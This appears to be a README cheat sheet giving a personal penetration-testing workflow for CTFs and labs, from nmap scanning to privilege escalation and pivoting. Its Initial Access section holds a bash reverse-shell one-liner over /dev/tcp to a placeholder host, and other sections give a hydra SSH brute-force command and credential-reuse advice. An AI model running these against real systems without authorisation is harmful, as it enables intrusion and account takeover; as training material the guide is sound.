# 🛡️ Pentesting Methodology

<div align="center">

![Pentest](https://img.shields.io/badge/Pentest-Framework-red?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows-blue?style=for-the-badge)
![Focus](https://img.shields.io/badge/Focus-Web%20Security-orange?style=for-the-badge)

> Personal workflow for Hack The Box, CTF, labs, and real-world assessments.

</div>

---

# 📚 Table of Contents

- [🎯 Reconnaissance](#-1-reconnaissance)
- [🌐 Web Enumeration](#-2-web-enumeration)
- [🔎 Vulnerability Assessment](#-3-vulnerability-assessment)
- [🔐 Credential Attacks](#-4-credential-attacks)
- [💀 Initial Access](#-5-initial-access)
- [🖥️ Post Exploitation](#-6-post-exploitation)
- [⬆️ Privilege Escalation](#-7-privilege-escalation)
- [🌍 Pivoting & Lateral Movement](#-8-pivoting--lateral-movement)
- [📌 Persistence](#-9-persistence)
- [📝 Documentation](#-10-documentation)

---

# 🎯 1. Reconnaissance

> Identify attack surface and exposed services.

---

## 🔍 Port Scanning

### ⚡ Basic Scan
```bash
nmap -sC -sV -Pn TARGET
```

### 🚀 Full Port Scan
```bash
nmap -p- --min-rate 1000 TARGET
```

### 📡 UDP Scan
```bash
nmap -sU TARGET
```

---

## 🧩 Service Enumeration

| Service | Description |
|---|---|
| 🌐 HTTP/HTTPS | Web application |
| 🔑 SSH | Remote shell |
| 📂 FTP | File transfer |
| 🪟 SMB | File sharing |
| 🖥️ WinRM | Windows remote management |
| 🪟 RDP | Remote desktop |
| 🏢 LDAP | Directory service |
| 📡 SNMP | Information leakage |
| 🗄️ Database | Credential target |

---

## 🧠 Enumeration Mindset

```text
✔ What is exposed?
✔ What version is running?
✔ Can it authenticate?
✔ Is anonymous access enabled?
✔ Is file upload possible?
✔ Is there credential leakage?
```

---

# 🌐 2. Web Enumeration

> Perform if HTTP/HTTPS service is discovered.

---

## 🛠️ Technology Fingerprinting

### 🔧 Tools
- WhatWeb
- Wappalyzer
- Nmap NSE

### 💻 Example
```bash
whatweb http://target
```

### 🎯 Identify
- Framework
- CMS
- WAF
- JavaScript libraries
- Server version

---

## 📂 Directory Bruteforce

### 🔧 Tools
- ffuf
- feroxbuster
- gobuster

### 💻 Example
```bash
ffuf -u http://target/FUZZ -w wordlist.txt
```

### 🔥 Interesting Findings
```text
/admin
/uploads
/api
/backup
/.git
/.env
```

---

## 🌎 Subdomain Enumeration

### 🔧 Tools
- ffuf
- subfinder
- amass

### 💻 Example
```bash
ffuf -u http://FUZZ.target.com -H "Host: FUZZ.target.com" -w subdomains.txt
```

---

## 🕷️ Crawling & Content Discovery

### 🔧 Tools
- Burp Suite
- katana
- hakrawler

### 🎯 Look For
- Hidden endpoints
- Internal APIs
- JS secrets
- Hardcoded credentials
- Hidden routes

---

# 🔎 3. Vulnerability Assessment

---

## 🧨 CVE Enumeration

### 🔧 Tools
- searchsploit
- nuclei
- exploit-db

### 💻 Example
```bash
searchsploit apache 2.4
```

### 🎯 Focus Areas
- Known vulnerabilities
- Outdated software
- Public exploit availability

---

## 🧪 Manual Testing

### ⚠️ Common Vulnerabilities
- IDOR
- SQL Injection
- XSS
- SSTI
- SSRF
- LFI / RFI
- File Upload
- Auth Bypass
- Command Injection

### 🔧 Tools
- Burp Suite
- sqlmap
- ffuf

---

# 🔐 4. Credential Attacks

---

## 🔓 Brute Force

### 🔧 Tools
- Hydra
- Medusa
- Burp Intruder

### 💻 Example
```bash
hydra -l admin -P rockyou.txt ssh://target
```

---

## ♻️ Credential Reuse

### 🎯 Try credentials on:
- SSH
- SMB
- FTP
- WinRM
- Database
- Web admin panel

> ⚠️ Password reuse is extremely common.

---

# 💀 5. Initial Access

---

## ⚔️ Exploitation Sources

- CVE exploit
- File upload
- Command injection
- SSTI
- Authentication bypass
- Deserialization

---

## 🐚 Reverse Shell

### 🐧 Bash Reverse Shell
```bash
bash -i >& /dev/tcp/IP/PORT 0>&1
```

### 📡 Netcat Listener
```bash
nc -lvnp PORT
```

---

# 🖥️ 6. Post Exploitation

---

## 🛠️ Shell Stabilization

### 🐍 Python PTY
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### 🔧 TTY Fix
```bash
CTRL+Z
stty raw -echo
fg
reset
```

---

## 🔍 Internal Enumeration

### 🎯 Look For
- Credentials
- SSH keys
- Tokens
- Config files
- Cronjobs
- Mounted shares
- Internal services

### 🔧 Tools
- linpeas
- winpeas
- pspy

---

# ⬆️ 7. Privilege Escalation

---

# 🐧 Linux Privilege Escalation

---

## 🧾 Sudo Misconfiguration

### 💻 Check Permissions
```bash
sudo -l
```

---

## 🧨 GTFOBins

### ⚠️ Common Exploitable Binaries
- vim
- less
- awk
- tar
- find
- python

🌐 https://gtfobins.github.io

---

## 🔍 SUID Enumeration

```bash
find / -perm -4000 2>/dev/null
```

---

## 💣 Kernel Exploit

Use if:
- Vulnerable kernel detected
- Public exploit available
- Environment compatible

---

# 🪟 Windows Privilege Escalation

---

## 🎯 Check For
- SeImpersonatePrivilege
- Weak service permissions
- Stored credentials
- Unquoted service paths
- AlwaysInstallElevated

### 🔧 Tools
- winPEAS
- PowerUp
- Seatbelt

---

# 🌍 8. Pivoting & Lateral Movement

---

## 🔧 Tools
- Chisel
- Ligolo-ng
- SSH tunneling
- Proxychains

---

## 🎯 Goals
- Access internal services
- Reach isolated networks
- Forward local ports
- Enumerate internal subnet

---

# 📌 9. Persistence

> Usually used in labs or red-team engagements.

### 🛠️ Common Methods
- SSH keys
- Cronjobs
- Scheduled tasks
- Service modification

---

# 📝 10. Documentation

---

## 📋 Record Everything

### ✅ Include
- Vulnerabilities
- Credentials
- Exploit chain
- Screenshots
- Proof of concept
- Remediation

---

# 🔄 Pentesting Flow

```text
Reconnaissance
      ↓
Enumeration
      ↓
Vulnerability Assessment
      ↓
Credential Attack
      ↓
Initial Access
      ↓
Post Exploitation
      ↓
Privilege Escalation
      ↓
Pivoting / Lateral Movement
      ↓
Documentation
```

---

# ⚡ Important Notes

> 🔥 Enumeration is the most important phase.

```text
✔ Read error messages carefully
✔ Reuse credentials everywhere
✔ Always check default credentials
✔ Think like a developer
✔ Manual testing > automated scanning
✔ Small information leaks can become full compromise
```

---

# 📦 Recommended Wordlists

## 📚 SecLists
https://github.com/danielmiessler/SecLists

## 💣 PayloadsAllTheThings
https://github.com/swisskyrepo/PayloadsAllTheThings

---

# 🧰 Recommended Tools

| Category | Tool |
|---|---|
| 🔍 Scanner | Nmap |
| 🌐 Web Proxy | Burp Suite |
| 📂 Bruteforce | ffuf |
| 🧨 Vulnerability Scanner | nuclei |
| 🔐 Credential Attack | Hydra |
| 🐧 Linux PrivEsc | linpeas |
| 🪟 Windows PrivEsc | winpeas |
| 🌍 Pivoting | Ligolo-ng |
| 🔎 Exploit Search | searchsploit |

---

<div align="center">

## 🚀 Happy Hacking

> "Enumeration is everything."

</div>